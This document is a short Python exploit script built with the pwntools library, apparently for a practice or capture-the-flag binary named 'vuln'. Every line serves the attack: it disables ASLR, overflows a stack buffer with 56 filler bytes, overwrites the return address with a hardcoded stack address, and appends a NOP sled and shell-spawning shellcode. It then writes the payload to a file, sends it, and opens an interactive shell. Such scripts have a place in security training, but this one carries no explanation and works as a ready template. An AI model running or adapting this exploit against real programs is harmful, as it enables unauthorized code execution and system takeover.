from pwn import *

# context.log_level = 'debug'
context.terminal = '/bin/sh'
context.aslr = False
context.arch = 'amd64'
context.os = 'linux'

p = process('./vuln')

junk = b'A' * 56
nop_sled = b"\x90"
addr = p64(0x7fffffffde10)
shellcode = asm(shellcraft.sh())
# libc.address = 0x7ffff7d8c000

payload = junk + addr + (nop_sled * 300) + shellcode

file = open('payload', 'wb')
file.write(payload)
file.close()

p.sendline(payload)
p.interactive()